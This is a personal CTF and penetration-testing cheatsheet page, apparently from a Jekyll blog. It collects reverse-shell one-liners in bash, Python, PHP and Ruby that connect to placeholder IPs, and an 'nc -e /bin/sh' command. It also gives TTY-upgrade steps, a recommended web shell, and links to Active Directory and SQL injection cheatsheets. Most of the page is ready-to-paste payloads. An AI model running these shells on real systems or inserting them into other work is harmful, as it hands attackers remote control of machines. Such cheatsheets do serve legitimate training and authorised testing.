---
layout: single
author_profile: true
permalink: /notes/ctf
toc: true
title: CTF Notes and Cheatsheets
toc_label: "Contents"
toc_icon: "fab fa-fw fa-th-list"
---

## Intro

This is a collection of commands and cheatsheets that I use on a regular basis, the original locations as to where these commands came from will be linked along side the commands. Again, these are not my creations, this is just a note of tools and commands that I have frequently used and that I think are useful. 

## Bash Prompt
[Here is a copy of my bash prompt](/bashrc)

## Shells
### Reverse Shells

{% highlight bash %}
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
{% endhighlight %}

{% highlight python %}
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

{% highlight php %}
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
{% endhighlight %}

{% highlight ruby %}
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
{% endhighlight %}

[PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

[Perl Reverse Shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

Credits for all of these shells goes to [pentestmonkey](http://pentestmonkey.net/)

### Web Shells

[p0wny@shell:~#](https://github.com/flozz/p0wny-shell) - My absolute favorite webshell

{% highlight php %}

{% endhighlight %}

### Interactive TTY Spawning

{% highlight bash linenos %}
nc -e /bin/sh 10.10.10.10 9001
{% endhighlight %}

{% highlight python linenos %}
python -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}

`Ctrl + Z`

{% highlight bash linenos %}
stty raw -echo && fg && reset
{% endhighlight %}

{% highlight bash linenos %}
export SHELL=bash
export TERM=tmux
stty rows 48 columns 127
{% endhighlight %}

## AD 

This [GitHub Page](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) by [S1ckB0y1337](https://github.com/S1ckB0y1337) is fantastic.

## SQLi

[MySQL Injection Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) - [pentestmonkey](http://pentestmonkey.net/)

[PortSwigger SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) - [PortSwigger](https://portswigger.net/)

[w3schools SQLi Explanation](https://www.w3schools.com/sql/sql_injection.asp)